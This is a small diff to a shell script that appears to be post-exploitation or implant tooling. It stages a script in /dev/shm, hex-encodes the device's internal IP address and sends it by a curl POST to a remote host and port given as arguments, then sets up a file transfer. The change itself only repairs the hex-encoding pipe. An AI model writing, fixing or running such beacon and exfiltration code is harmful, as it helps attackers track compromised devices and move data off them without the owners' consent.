@@ -16,7 +16,7 @@ PREP_SCRIPT=/dev/shm/prep.sh
 
 # Report back internal IP address of device in hex
 GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)
-curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | x -p) -H 'Content-Type: application/json' -X POST http://${1}:${2}/${GET_INTERNAL_IP}
+curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p) -H 'Content-Type: application/json' -X POST http://${1}:${2}/${GET_INTERNAL_IP}
 
 # Prepare file destination and transfer files
 mkdir -p ${OUT_PATH}
